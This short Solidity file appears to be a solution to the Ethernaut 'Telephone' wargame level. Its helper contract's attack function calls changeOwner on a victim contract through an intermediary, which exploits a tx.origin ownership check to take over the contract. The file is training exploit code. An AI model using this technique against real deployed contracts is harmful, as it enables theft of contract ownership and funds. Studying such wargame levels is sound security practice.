// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "ethernaut/contracts/levels/Telephone.sol";

contract TelephoneHelper {
  function attack(address _victim) public {
    Telephone telephone = Telephone(_victim);
    telephone.changeOwner(msg.sender);
  }
}